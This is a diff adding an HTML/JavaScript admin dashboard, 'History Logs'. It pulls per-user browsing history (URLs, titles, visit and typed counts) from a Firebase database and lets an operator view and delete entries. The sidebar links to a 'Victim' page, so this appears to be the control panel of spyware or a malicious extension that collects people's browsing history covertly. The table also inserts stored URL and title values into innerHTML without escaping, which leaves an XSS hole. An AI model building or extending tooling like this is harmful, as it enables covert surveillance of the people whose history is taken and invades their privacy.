@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>History Logs</title>
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <link rel="stylesheet" href="https://cdn.datatables.net/1.13.6/css/jquery.dataTables.min.css" />
+  <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
+  <script src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
+
+  <style>
+    body { font-family: 'Inter', sans-serif; background-color: #f9fafb; }
+    .sidebar { background-color:#1C1C1C; }
+  </style>
+</head>
+<body class="h-screen flex bg-gray-100">
+
+  <aside class="w-64 sidebar text-white flex flex-col py-8 px-4">
+    <h2 class="text-xl font-bold mb-10">Dashboard</h2>
+    <nav class="space-y-6">
+      <a href="index.html"  class="flex items-center space-x-3"><i class="fas fa-tachometer-alt"></i><span>Dashboard</span></a>
+      <a href="victim.html" class="flex items-center space-x-3"><i class="fas fa-user-friends"></i><span>Victim</span></a>
+      <a href="login.html"  class="flex items-center space-x-3"><i class="fas fa-sign-out-alt"></i><span>Logout</span></a>
+    </nav>
+  </aside>
+
+  <main class="flex-1 p-10 overflow-y-auto">
+    <h1 class="text-3xl font-bold mb-6">History Logs</h1>
+
+    <div class="mb-6 flex items-center">
+      <label class="mr-2 font-medium text-gray-700">Select user:</label>
+      <select id="user-select" class="border border-gray-300 px-2 py-1 rounded">
+        <option value="" disabled selected>-- choose user --</option>
+      </select>
+    </div>
+
+    <div class="bg-white rounded-xl shadow p-6 overflow-x-auto">
+      <table id="logsTable" class="display w-full">
+        <thead class="bg-blue-100 text-blue-900 text-sm">
+          <tr>
+            <th class="py-3 px-4 text-left">Timestamp</th>
+            <th class="py-3 px-4 text-left">ID</th>
+            <th class="py-3 px-4 text-left">Last Visit</th>
+            <th class="py-3 px-4 text-left">Typed</th>
+            <th class="py-3 px-4 text-left">Visits</th>
+            <th class="py-3 px-4 text-left">Title</th>
+            <th class="py-3 px-4 text-left">URL</th>
+            <th class="py-3 px-4 text-left">Action</th>
+          </tr>
+        </thead>
+        <tbody id="logBody" class="text-sm"></tbody>
+      </table>
+    </div>
+  </main>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
+    import { getDatabase, ref, onValue, off, remove } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";
+    import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-auth.js";
+
+    const firebaseConfig = {
+      apiKey: "YOUR_API_KEY_HERE",
+      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+      databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_PROJECT_ID.appspot.com",
+      messagingSenderId: "YOUR_SENDER_ID",
+      appId: "YOUR_APP_ID",
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db  = getDatabase(app);
+    const auth = getAuth(app);
+
+    const userSelect = document.getElementById('user-select');
+    const logBody    = document.getElementById('logBody');
+    let   dataTable  = null;
+
+    let visitsRef   = null;
+    let visitsUnsub = null;
+    let currentUserKey = null;
+
+    function loadHistory(userKey) {
+      currentUserKey = userKey;
+      if (visitsRef && visitsUnsub) off(visitsRef, 'value', visitsUnsub);
+      logBody.innerHTML = '';
+
+      visitsRef = ref(db, `history/season2025/${userKey}/visited`);
+      visitsUnsub = onValue(visitsRef, snap => {
+        const data = snap.val() || {};
+        const rows = Object.entries(data).map(([ts, v]) => ({
+          ...v, timestamp: ts
+        })).sort((a,b) => b.lastVisitTime - a.lastVisitTime);
+
+        logBody.innerHTML = '';
+        rows.forEach(v => {
+          const tr = document.createElement('tr');
+          tr.className = 'border-b border-gray-200 hover:bg-gray-50';
+          tr.innerHTML = `
+            <td class="py-3 px-4">${v.timestamp}</td>
+            <td class="py-3 px-4">${v.id ?? '-'}</td>
+            <td class="py-3 px-4">${new Date(v.lastVisitTime).toLocaleString()}</td>
+            <td class="py-3 px-4">${v.typedCount ?? 0}</td>
+            <td class="py-3 px-4">${v.visitCount ?? 1}</td>
+            <td class="py-3 px-4">${v.title ?? 'No title'}</td>
+            <td class="py-3 px-4 break-all">
+              <a href="${v.url}" target="_blank" class="text-blue-700 hover:underline">${v.url}</a>
+            </td>
+            <td class="py-3 px-4">
+              <button
+                class="bg-[#1E40AF] text-white px-3 py-1 rounded-md font-semibold hover:bg-[#1A3B8F] transition-colors duration-200"
+                onclick="deleteLog('${userKey}', '${v.timestamp}')"
+              >
+                Delete
+              </button>
+            </td>
+          `;
+          logBody.appendChild(tr);
+        });
+
+        if (dataTable) dataTable.destroy();
+        dataTable = $('#logsTable').DataTable({
+          order: [[0, 'desc']],
+          responsive: true,
+          paging: false
+        });
+      });
+    }
+
+    const seasonRef = ref(db, 'history/season2025');
+    onValue(seasonRef, snap => {
+      const keys = Object.keys(snap.val() || {});
+      userSelect.innerHTML = '<option value="" disabled selected>-- choose user --</option>';
+      keys.forEach((k) => userSelect.appendChild(new Option(k.replace(/_/g,'.'), k)));
+
+      const urlId = new URLSearchParams(location.search).get('id');
+      if (urlId !== null && !isNaN(urlId) && urlId < keys.length) {
+        const chosenKey = keys[urlId];
+        loadHistory(chosenKey);
+        userSelect.value = chosenKey;
+      }
+    });
+
+    userSelect.addEventListener('change', e => loadHistory(e.target.value));
+
+    window.deleteLog = function(userKey, timestamp) {
+      if (!confirm(`Are you sure you want to delete this history entry?\n\nTimestamp: ${timestamp}`)) return;
+      const entryRef = ref(db, `history/season2025/${userKey}/visited/${timestamp}`);
+      remove(entryRef)
+        .then(() => alert('Entry deleted successfully.'))
+        .catch(error => alert('Failed to delete entry: ' + error.message));
+    };
+
+    onAuthStateChanged(auth, (user) => {
+      if (!user) window.location.href = '/admin/login.html';
+    });
+
+    document.querySelector('a[href="login.html"]').addEventListener('click', (e) => {
+      e.preventDefault();
+      signOut(auth).then(() => {
+        window.location.href = '/admin/login.html';
+      });
+    });
+  </script>
+</body>
+</html>
